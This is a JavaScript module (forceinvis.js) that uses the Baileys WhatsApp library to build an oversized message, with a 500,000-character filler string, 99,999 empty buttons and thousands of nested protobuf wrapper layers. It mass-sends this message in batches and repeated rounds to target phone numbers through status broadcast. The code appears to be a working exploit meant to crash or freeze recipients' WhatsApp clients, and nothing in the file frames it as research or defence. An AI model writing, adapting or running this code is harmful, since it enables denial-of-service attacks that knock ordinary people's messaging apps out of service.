// forceinvis.js
const proto = require('@whiskeysockets/baileys').proto;

async function ForceInvis(sock, target) {
    const message = {
        groupStatusMessageV2: {
            body: { text: "Helo" },
            nativeFlowMessage: {
                buttons: "\u0000" + "\u3164".repeat(500000),
                nativeFlowResponseMessage: {
                    buttons: Array.from({ length: 99999 }, () => ({}))
                }
            }
        }
    };

    const encodeVarint = (n) => {
        let buf = [];
        while (n >= 0x80) { buf.push((n & 0x7f) | 0x80); n >>>= 7; }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = (tag, data) => Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);

    const resolveJid = (raw) => {
        let s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target]).map(resolveJid).filter(j => j.length > 15);
    if (!jids.length) throw new Error('No valid JIDs');

    const basePayload = proto.Message.encode(proto.Message.fromObject(message)).finish();

    const tags = [
        [0xBA, 0x03], [0xD2, 0x04], [0xAA, 0x02],
        [0xCC, 0x05], [0xDD, 0x06]
    ];

    const inflatePayload = (tag, depth) => {
        let buf = basePayload;
        for (let i = 0; i < depth; i++) buf = wrapLd(tag, wrapLd([0x0A], buf));
        return buf;
    };

    let totalSent = 0;
    const maxBatch = 15;
    const delayMs = 10000;
    const rounds = 20;

    for (let offset = 0; offset < jids.length; offset += maxBatch) {
        const chunk = jids.slice(offset, offset + maxBatch);
        const batchNum = Math.floor(offset / maxBatch) + 1;
        const totalBatches = Math.ceil(jids.length / maxBatch);

        if (offset > 0) await new Promise(r => setTimeout(r, delayMs));

        const suffix = '-' + batchNum;

        for (let round = 0; round < rounds; round++) {
            for (let ti = 0; ti < tags.length; ti++) {
                const tag = tags[ti];
                let payload = null;
                for (let depth = 3000; depth > 0 && !payload; depth -= 200) {
                    try {
                        const decoded = proto.Message.decode(inflatePayload(tag, depth));
                        proto.Message.encode(decoded).finish();
                        payload = decoded;
                    } catch (_) {}
                }
                if (payload) {
                    const msgId = 'nullpay' + Date.now().toString(36).toUpperCase() + suffix + '-r' + round + '-t' + ti;
                    await sock.relayMessage('status@broadcast', payload, {
                        messageId: msgId,
                        statusJidList: chunk,
                        additionalNodes: [{
                            tag: 'meta',
                            attrs: {},
                            content: [{
                                tag: 'mentioned_users',
                                attrs: {},
                                content: chunk.map(jid => ({ tag: 'to', attrs: { jid }, content: [] }))
                            }]
                        }]
                    });
                    totalSent++;
                }
            }
        }
        console.log(`✅ batch ${batchNum}/${totalBatches} done, total: ${totalSent}`);
    }

    console.log(` DONE! Total messages: ${totalSent}`);
    if (!totalSent) throw new Error('Function Error');
}

module.exports = { ForceInvis };